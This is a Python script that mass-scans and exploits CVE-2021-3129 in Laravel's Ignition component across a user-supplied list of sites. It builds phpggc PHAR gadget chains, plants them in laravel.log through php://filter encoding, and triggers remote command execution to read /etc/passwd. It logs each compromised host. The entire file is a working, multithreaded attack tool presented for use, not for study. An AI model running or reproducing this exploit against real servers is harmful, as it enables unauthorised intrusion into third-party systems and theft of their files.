import requests, subprocess, re, os, sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

confDebug = False
confVerify = False
confAllowRedirect = False
confTimeout = 15
confCommand = 'cat /etc/passwd'
confChain = [
    'Laravel/RCE1',
    'Laravel/RCE2',
    'Laravel/RCE3',
    'Laravel/RCE4',
    'Laravel/RCE5',
    'Laravel/RCE6',
    'Laravel/RCE7',
    'Monolog/RCE1',
    'Monolog/RCE2',
    'Monolog/RCE3',
    'Monolog/RCE4'
]

if os.path.exists("phpggc"):
    pass
else:
    os.system("git clone https://github.com/ambionics/phpggc.git")
        
def debug(url, err):
    if confDebug == True:
        if 'ConnectTimeout' in err:
            open('laravel_ConnectTimeout.log', 'a').write(f'[ERR] {url} : {err}\n')
        elif 'ConnectionError' in err:
            open('laravel_ConnectionError.log', 'a').write(f'[ERR] {url} : {err}\n')
        else:
            open('laravel_dbug.log', 'a').write(f'[ERR] {url} : {err}\n')
    else:pass
        
def vulnerable(url):
    try:
        check = requests.get(url, timeout=confTimeout, verify=confVerify)
        if check.status_code != 405 and "laravel" not in check.text:
            return False
        else:
            return True
    except Exception as err:
        debug(url, str(err))
        return False
    
def send(url, viewfile):
    try:
        headers = {"Accept": "application/json"}
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "TrustSEC",
                "viewFile": viewfile
            }
        }
        execute = requests.post(url, json=data, headers=headers, verify=confVerify)
        return execute
    except Exception as err:
        debug(url, str(err))
        return False

def generate(chain, command):
    if sys.platform == 'darwin':    
        payload = subprocess.getoutput(f"php -d 'phar.readonly=0' ./phpggc/phpggc {chain} system {command} --phar phar -o php://output | base64 -b 0 | sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'")
    else:
        payload = subprocess.getoutput(f"php -d 'phar.readonly=0' ./phpggc/phpggc {chain} system {command} --phar phar -o php://output | base64 -w 0 | sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'")
        
    return payload

def clear(url):
    payloadClear = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
    while (send(url, payloadClear).status_code != 200):
        continue

def exploit(url):
    if 'http://' not in url:
        url = 'http://'+ url
    else:pass
    
    if '/_ignition/execute-solution' not in url:
        url = url +'/_ignition/execute-solution'
    else:pass
    
    try:
        print (f'[!] [ CVE-2021-3129 ] Check : {url}')
        if vulnerable(url):
            clear(url)
            send(url, "AA")
            
            for chain in confChain:
                send(url, generate(chain, confCommand))
                send(url, "php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")
                
                attack = send(url, "phar://../storage/logs/laravel.log")
                # response = re.sub("{[\s\S]*}", "", attack.text)
                if 'root:x:' in attack.text or 'root:x:' in str(attack.content):
                    open('laravelrce.txt', 'a').write(url +'\n')
                    print (f'[!] [ CVE-2021-3129 ] Vulnerable {chain} : {url}')
                else:
                    print (f'[!] [ CVE-2021-3129 ] NOT Vulnerable {chain} : {url}')

            clear(url)
        else:
            print (f'[!] [ CVE-2021-3129 ] Not Vulnerable : {url}')
    except Exception as err:
        debug(url, str(err))
        
def init():
    sitelist = input("[?] Sitelist : ")
    thread = input("[?] Thread   : ")
    if sitelist == "":
        print("[!] Put Sitelist!")
        init()
    else:
        try:
            sites = open(sitelist, "r").read().splitlines()
            try:
                pp = Pool(int(thread))
                pp.map(exploit, sites)
            except:
                pass
        except:
            print("[!] Sitelist not found!")
            sys.exit()

init()
